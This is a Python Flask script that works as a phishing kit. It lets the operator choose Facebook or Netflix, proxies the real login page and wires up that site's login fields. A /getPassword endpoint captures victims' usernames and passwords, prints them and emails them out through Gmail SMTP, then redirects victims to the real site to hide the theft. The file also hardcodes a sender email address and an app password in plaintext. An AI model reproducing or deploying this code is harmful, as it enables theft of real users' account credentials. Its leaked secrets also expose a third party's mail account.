from flask import Flask, jsonify, Response, request, send_from_directory, render_template, redirect
from flask_cors import CORS
import requests
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

app = Flask(__name__)
CORS(app)

target_url = "https://www.netflix.com/in/Login"

login_button = ".login-button"
user_name_field = "#id_userLoginId"
password_field = "#id_password"

choice = input("Choose following options for phishing: \n 1. Facebook \n 2. Netflix \n")

if choice == "1":
    target_url = "https://facebook.com"
    login_button = "._42ft"
    user_name_field = "#email"
    password_field = "#pass"
    print("Phishing for Facebook")
elif choice == "2":
    target_url = "https://www.netflix.com/Login"
    login_button = ".login-button"
    user_name_field = "#id_userLoginId"
    password_field = "#id_password"
    print("Phishing for Netflix")

@app.route('/', methods=['GET', 'POST'])
def serve_index():
    # After submitting the form redirect to '/' happens in post request check the get or post method in request and show index.html or redirect to target_url
    if(request.method == "GET"):
        return render_template('index.html', login_button = login_button
                                       , user_name_field = user_name_field
                                       , password_field = password_field)
    else:
        return redirect(target_url)

@app.route('/proxy')
def proxy():
    response = requests.get(target_url)
    return Response(response.text, status=response.status_code, content_type=response.headers['content-type'])
  
@app.route('/getPassword', methods=['GET', 'POST'])
def get_password():
    user_id = request.args.get('id')
    user_password = request.args.get('password')

    print("Username and password: ", user_id, user_password)
    send_email(user_id, user_password)
      
    return redirect("/")

def send_email(user_id, user_password):
    sender_email = 'shubham.verma@whitehatjr.com'
    sender_password = 'drgn escc zwnh grfw'
    recipient_email = 'shubham.verma@whitehatjr.com'

    subject = 'User Credentials'
    if choice == "1":
       subject = subject + ": Facebook"
    elif choice == "2":
       subject = subject + ": Netflix"

    message_body = f'User ID: {user_id}\nUser Password: {user_password}'
        
    try:
        smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
        smtp_server.starttls()
        smtp_server.login(sender_email, sender_password)

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = recipient_email
        message["Subject"] = subject
        message.attach(MIMEText(message_body, "plain"))

        smtp_server.sendmail(sender_email, recipient_email, message.as_string())
        smtp_server.quit()

    except Exception as e:
        print("Error", f"An error occurred: {str(e)}")

    
    
if __name__ == '__main__':
    app.run(port=5000)
